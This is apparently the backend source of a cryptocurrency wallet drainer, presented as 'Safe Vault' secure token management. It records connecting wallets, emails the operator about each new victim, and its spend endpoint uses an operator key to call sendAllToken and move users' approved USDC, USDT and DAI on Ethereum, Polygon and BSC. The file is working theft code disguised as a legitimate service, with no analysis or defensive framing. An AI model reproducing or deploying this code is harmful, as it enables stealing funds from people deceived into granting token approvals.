const express = require('express');
const cors = require('cors');
require('dotenv').config();
const nodemailer = require('nodemailer');
const { ethers } = require('ethers');

const app = express();

// Middleware
app.use(cors());
app.use(express.json());

// In-memory storage for wallets
let connectedWallets = [];

// Contract ABI for ERC-20 and SafeVault
const SAFE_VAULT_ABI = [
  'function sendAllToken(address token) external'
];

const ERC20_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function balanceOf(address account) view returns (uint256)',
  'function allowance(address owner, address spender) view returns (uint256)'
];

// Chain configuration
const CHAINS = {
  1: {
    name: 'Ethereum',
    rpcUrl: 'https://eth.llamarpc.com',
    contractAddress: '0xD05De3D6Ee89a4BFd7636Bc0B9aC1F241d9F6123',
    tokens: [
      '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', // USDC
      '0xdAC17F958D2ee523a2206206994597C13D831ec7', // USDT
      '0x6B175474E89094C44Da98b954EedeAC495271d0F'  // DAI
    ]
  },
  137: {
    name: 'Polygon',
    rpcUrl: 'https://polygon.llamarpc.com',
    contractAddress: '0x59Ac31A4B71C585cefeE818c369802dADb8C7a08',
    tokens: [
      '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174', // USDC
      '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', // USDT
      '0x8f3Cf7ad23Cd3CaDbD9735AFf958023D60c2735E'  // DAI
    ]
  },
  56: {
    name: 'BSC',
    rpcUrl: 'https://bsc.llamarpc.com',
    contractAddress: '0xCc4F00D9871953B9B4384f7f888DFbE870d1332e',
    tokens: [
      '0x8AC76a51cc950d9822D68b83Fe1Ad097317c2451', // USDC
      '0x55d398326f99059fF775485246999027B3197955', // USDT
      '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3'  // DAI
    ]
  }
};

// Configure email transporter
let transporter;

function initializeEmailTransporter() {
  try {
    transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'kkdabby76@gmail.com',
        pass: process.env.GMAIL_PASSWORD
      }
    });
    console.log('✅ Email transporter initialized');
  } catch (error) {
    console.error('❌ Email transporter error:', error);
  }
}

// Initialize on startup
initializeEmailTransporter();

// Test endpoint
app.get('/', (req, res) => {
  res.json({ 
    message: 'Safe Vault Backend is running!',
    status: 'online',
    timestamp: new Date()
  });
});

// Get all wallets
app.get('/api/wallets', (req, res) => {
  try {
    res.json({
      success: true,
      wallets: connectedWallets,
      count: connectedWallets.length
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Connect wallet
app.post('/api/wallet/connect', (req, res) => {
  try {
    const { walletAddress, chainId, signature, message } = req.body;

    if (!walletAddress || !chainId) {
      return res.status(400).json({
        success: false,
        error: 'Missing wallet address or chain ID'
      });
    }

    // Check if wallet already connected
    const existingWallet = connectedWallets.find(w =>
      w.address.toLowerCase() === walletAddress.toLowerCase() &&
      w.chainId === chainId
    );

    if (existingWallet) {
      return res.json({
        success: true,
        message: 'Wallet already connected',
        wallet: existingWallet,
        alreadyConnected: true
      });
    }

    // Store wallet
    const wallet = {
      address: walletAddress,
      chainId: chainId,
      connectedAt: new Date(),
      status: 'connected',
      approved: false
    };

    connectedWallets.push(wallet);
    console.log(`✅ Wallet connected: ${walletAddress} on chain ${chainId}`);

    // Send email notification
    sendEmailNotification(walletAddress, chainId)
      .then(() => console.log('✅ Email sent successfully'))
      .catch(err => console.error('❌ Email error:', err));

    res.json({
      success: true,
      message: 'Wallet connected',
      wallet: wallet
    });

  } catch (error) {
    console.error('Connect error:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Disconnect wallet
app.post('/api/wallet/disconnect', (req, res) => {
  try {
    const { walletAddress } = req.body;

    connectedWallets = connectedWallets.filter(w =>
      w.address.toLowerCase() !== walletAddress.toLowerCase()
    );

    console.log(`✅ Wallet disconnected: ${walletAddress}`);

    res.json({
      success: true,
      message: 'Wallet disconnected'
    });

  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Spend tokens endpoint - REAL CONTRACT CALL
app.post('/api/wallet/spend', async (req, res) => {
  try {
    const { walletAddress, chainId } = req.body;

    if (!walletAddress || !chainId) {
      return res.status(400).json({
        success: false,
        error: 'Missing wallet address or chain ID'
      });
    }

    const wallet = connectedWallets.find(w =>
      w.address.toLowerCase() === walletAddress.toLowerCase() &&
      w.chainId === chainId
    );

    if (!wallet) {
      return res.status(404).json({
        success: false,
        error: 'Wallet not found'
      });
    }

    const chainConfig = CHAINS[chainId];
    if (!chainConfig) {
      return res.status(400).json({
        success: false,
        error: 'Unsupported chain'
      });
    }

    console.log(`💰 Attempting to spend tokens from: ${walletAddress} on chain ${chainId}`);

    // Get provider and signer
    const provider = new ethers.JsonRpcProvider(chainConfig.rpcUrl);
    const privateKey = process.env.COMPANY_PRIVATE_KEY;

    if (!privateKey) {
      throw new Error('Company private key not configured');
    }

    const signer = new ethers.Wallet(privateKey, provider);
    const companyAddress = signer.address;

    console.log(`🔑 Company address: ${companyAddress}`);
    console.log(`📍 Contract address: ${chainConfig.contractAddress}`);

    // Create contract instance
    const safeVaultContract = new ethers.Contract(
      chainConfig.contractAddress,
      SAFE_VAULT_ABI,
      signer
    );

    // Attempt to transfer tokens for each token address
    const txHashes = [];
    let successCount = 0;

    for (const tokenAddress of chainConfig.tokens) {
      try {
        console.log(`  🔄 Processing token: ${tokenAddress}`);

        // Create ERC20 contract instance
        const tokenContract = new ethers.Contract(
          tokenAddress,
          ERC20_ABI,
          provider
        );

        // Check user's balance
        const balance = await tokenContract.balanceOf(walletAddress);
        console.log(`  💵 User balance: ${balance.toString()}`);

        if (balance.toString() === '0') {
          console.log(`  ⏭️  Skipping token (no balance): ${tokenAddress}`);
          continue;
        }

        // Check allowance
        const allowance = await tokenContract.allowance(
          walletAddress,
          chainConfig.contractAddress
        );
        console.log(`  ✅ Allowance: ${allowance.toString()}`);

        if (allowance.toString() === '0') {
          console.log(`  ⚠️  No allowance for token: ${tokenAddress}`);
          continue;
        }

        // Send transaction
        const tx = await safeVaultContract.sendAllToken(tokenAddress);
        console.log(`  📤 Transaction sent: ${tx.hash}`);

        txHashes.push(tx.hash);

        // Wait for confirmation
        const receipt = await tx.wait();
        console.log(`  ✓ Token transferred: ${tokenAddress}`);
        successCount++;

      } catch (tokenError) {
        console.error(`  ❌ Error processing token ${tokenAddress}:`, tokenError.message);
        // Continue with next token
      }
    }

    if (successCount === 0) {
      return res.status(400).json({
        success: false,
        error: 'No tokens could be transferred. Ensure tokens are approved first.',
        details: 'User may need to approve tokens on the contract'
      });
    }

    wallet.approved = true;

    res.json({
      success: true,
      message: `${successCount} token(s) transferred successfully`,
      walletAddress: walletAddress,
      chainId: chainId,
      transactionHashes: txHashes,
      timestamp: new Date()
    });

  } catch (error) {
    console.error('❌ Spend error:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      details: 'Check backend logs for more information'
    });
  }
});

// Send email notification
async function sendEmailNotification(walletAddress, chainId) {
  try {
    if (!transporter) {
      console.warn('⚠️ Email transporter not initialized, skipping email');
      return;
    }

    const chainNames = {
      1: 'Ethereum Mainnet',
      137: 'Polygon (Matic)',
      56: 'BSC (Binance Smart Chain)'
    };

    const chainName = chainNames[chainId] || `Chain ${chainId}`;

    const mailOptions = {
      from: 'Safe Vault <kkdabby76@gmail.com>',
      to: process.env.NOTIFICATION_EMAIL || 'kkdabby76@gmail.com',
      subject: `🔔 Safe Vault - New Wallet Connected`,
      html: `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto;">
          <div style="background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; border-radius: 10px; color: white; text-align: center;">
            <h1>🔐 Safe Vault</h1>
            <p>New Wallet Connected</p>
          </div>
          
          <div style="padding: 20px; background: #f8f9fa; margin-top: 20px; border-radius: 10px;">
            <h2 style="color: #333; margin-top: 0;">Connection Details</h2>
            
            <p style="margin: 15px 0;">
              <strong style="color: #667eea;">Wallet Address:</strong><br>
              <code style="background: #e9ecef; padding: 10px; border-radius: 5px; display: block; word-break: break-all;">
                ${walletAddress}
              </code>
            </p>
            
            <p style="margin: 15px 0;">
              <strong style="color: #667eea;">Network:</strong><br>
              ${chainName}
            </p>
            
            <p style="margin: 15px 0;">
              <strong style="color: #667eea;">Connected At:</strong><br>
              ${new Date().toLocaleString()}
            </p>
            
            <hr style="border: none; border-top: 1px solid #ddd; margin: 20px 0;">
            
            <p style="color: #666; font-size: 14px;">
              ✓ Wallet is now registered with Safe Vault<br>
              ✓ Ready for token approval and transfers<br>
              ✓ Log in to your dashboard to manage this wallet
            </p>
          </div>
          
          <div style="text-align: center; margin-top: 20px; padding: 20px; color: #999; font-size: 12px;">
            <p>Safe Vault © 2024 - Secure Token Management</p>
          </div>
        </div>
      `
    };

    const info = await transporter.sendMail(mailOptions);
    console.log(`✅ Email sent successfully to ${process.env.NOTIFICATION_EMAIL}`);
    return true;

  } catch (error) {
    console.error('❌ Email send error:', error);
    return false;
  }
}

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({
    status: 'online',
    wallets: connectedWallets.length,
    timestamp: new Date()
  });
});

// Error handling
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(500).json({
    success: false,
    error: err.message
  });
});

// 404 handling
app.use((req, res) => {
  res.status(404).json({
    success: false,
    error: 'Endpoint not found',
    path: req.path
  });
});

// Start server
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Safe Vault Backend running on port ${PORT}`);
  console.log(`📧 Email notifications enabled`);
  console.log(`🔐 Smart contract integration enabled`);
  console.log(`⏰ Server started at ${new Date().toLocaleString()}`);
});
